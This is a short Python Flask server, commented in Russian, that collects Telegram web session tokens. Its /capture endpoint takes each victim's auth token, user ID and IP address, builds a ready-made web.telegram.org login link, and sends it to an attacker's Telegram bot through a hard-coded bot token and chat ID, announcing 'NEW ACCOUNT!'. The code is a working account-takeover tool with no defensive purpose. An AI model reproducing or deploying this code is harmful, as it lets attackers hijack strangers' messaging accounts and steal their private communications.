from flask import Flask, request, redirect, send_from_directory
import requests
import os
from datetime import datetime
import json

app = Flask(__name__, static_folder='.')

BOT_TOKEN = "8541613029:AAF9uWzlAYEJy1kNM89yQfMtIz3bh53AOo4"
CHAT_ID = "8220267007"

@app.route('/')
def index():
    # Отдаём HTML-страницу, которая поймает hash
    return send_from_directory('.', 'index.html')

@app.route('/capture', methods=['POST'])
def capture():
    try:
        data = request.json
        print(f"🔥 ПЕРЕХВАЧЕНО: {data}")
        
        token = data.get('token')
        user_id = data.get('user_id')
        dc_id = data.get('dc_id', '2')
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        
        if token and user_id:
            login_url = f"https://web.telegram.org/k/#tgWebAuthToken={token}&tgWebAuthUserId={user_id}&tgWebAuthDcId={dc_id}"
            
            message = (
                f"🔥 НОВЫЙ АККАУНТ!\n"
                f"👤 User ID: {user_id}\n"
                f"🔑 Token: {token}\n"
                f"🌐 DC: {dc_id}\n"
                f"📱 IP: {ip}\n"
                f"🔗 {login_url}"
            )
            
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={"chat_id": CHAT_ID, "text": message},
                timeout=5
            )
        
        return 'OK', 200
    except Exception as e:
        print(f"❌ Ошибка: {e}")
        return 'Error', 500

@app.route('/health')
def health():
    return 'OK', 200
